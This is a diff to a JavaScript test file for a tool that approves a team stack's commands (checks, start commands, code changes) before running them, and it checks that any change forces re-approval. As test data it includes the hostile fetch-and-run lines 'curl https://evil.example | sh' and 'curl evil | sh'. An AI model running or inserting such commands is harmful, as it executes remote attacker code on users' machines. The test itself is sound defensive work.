@@ -4,7 +4,7 @@ import os from 'node:os';
 import path from 'node:path';
 // Approvals go to a throwaway folder, never the real config.
 process.env.KOPPLER_CONFIG_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'koppler-checks-'));
-const { approve, approved, checksFor, fingerprint, runChecks } = await import('../src/checks.mjs');
+const { approve, approved, checksFor, fingerprint, runChecks, stackCommands, startsFromStack } = await import('../src/checks.mjs');
 
 const stack = {
   source: '/team/stack.json', install: { cloudflared: 'brew install cloudflared' },
@@ -32,18 +32,34 @@ let results = runChecks(stack, world);
 assert.equal(results.find(r => r.name === 'vpn').state, 'pending');
 assert.deepEqual(ran, []);
 assert.deepEqual(results.filter(r => r.state === 'missing').map(r => r.name), ['kubectl']);
-assert.equal(approved(stack.source, checks), false);
-approve(stack.source, checks);
-assert.equal(approved(stack.source, checks), true);
+assert.equal(approved(stack.source, stack), false);
+approve(stack.source, stack);
+assert.equal(approved(stack.source, stack), true);
 results = runChecks(stack, world);
 assert.deepEqual(ran, ['pgrep -x vpnd']);
 assert.deepEqual(results.find(r => r.name === 'vpn'), { name: 'vpn', from: 'stack', state: 'missing', detail: 'Connect the VPN' });
 const changed = { ...stack, checks: [{ name: 'vpn', run: 'curl https://evil.example | sh' }] };
-assert.notEqual(fingerprint(checksFor(changed)), fingerprint(checks));
+assert.notEqual(fingerprint(stackCommands(changed)), fingerprint(stackCommands(stack)));
 assert.equal(runChecks(changed, world).find(r => r.name === 'vpn').state, 'pending');
 assert.equal(ran.length, 1, 'a changed command is not run before it is approved again');
 // A stack with no checks of its own has nothing to approve.
-assert.equal(approved('/other', checksFor({ apps: {} })), true);
+assert.equal(approved('/other', { apps: {} }), true);
+
+// Everything the stack would run or write is one list, approved as a whole: checks, start commands (per app, per
+// environment, per kind it defines) and remembered code changes. Any change to it needs approving again.
+{
+  const s1 = { source: '/s1', envs: ['qa', 'prod'], kinds: { deno: { label: 'Deno', start: 'deno task dev' } },
+    apps: { api: { name: 'API', kind: 'other', start: 'make run', envs: { prod: { start: 'make run-prod' } }, localChanges: [{ file: 'a.cs', find: 'x', replace: 'y' }] }, web: { name: 'Web', kind: 'node' }, d: { name: 'D', kind: 'deno' } } };
+  assert.deepEqual(stackCommands(s1).map(c => `${c.what}: ${c.name}`), ['start of every: deno app', 'start: API', 'start on prod: API', 'code change: API, a.cs']);
+  assert.deepEqual(['api', 'web', 'd'].map(id => startsFromStack(s1, id, 'qa')), [true, false, true]);
+  assert.equal(approved(s1.source, s1), false);
+  approve(s1.source, s1);
+  assert.equal(approved(s1.source, s1), true);
+  for (const edit of [a => { a.api.start = 'curl evil | sh'; }, a => { a.api.envs.prod.start = 'x'; }, a => { a.api.localChanges[0].replace = 'z'; }]) {
+    const next = JSON.parse(JSON.stringify(s1)); edit(next.apps);
+    assert.equal(approved(s1.source, next), false, 'a changed command needs approving again');
+  }
+}
 
 // Gaps per environment: a tunnel or a secret's steps the first environment has and another does not.
 {
